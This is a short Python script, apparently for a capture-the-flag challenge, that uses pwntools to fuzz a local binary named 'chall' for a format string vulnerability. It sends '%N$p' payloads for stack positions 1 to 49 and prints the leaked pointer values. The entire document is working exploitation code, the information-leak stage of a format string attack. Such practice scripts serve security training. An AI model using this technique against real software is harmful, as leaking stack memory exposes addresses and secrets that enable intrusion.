from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./chall', checksec=False)

# Let's fuzz x values
for i in range(1, 50):  # Adjust the range as necessary
    try:
        # Create process (level used to reduce noise)
        p = process('./chall', level='error')  # Ensure binary path is correct
        # Send controlled input to avoid corrupting the stack early
        payload = '%{}$p'.format(i).encode()
        p.recvuntil(b'tat!\n')
        p.sendline(payload)
        
        # Receive the response
        result = p.recvline().decode().strip()
        
        # Check for valid responses, avoid '(nil)'
        if result and result != '(nil)':
            print(f'{i}: {result}')
        p.close()

    except EOFError:
        pass
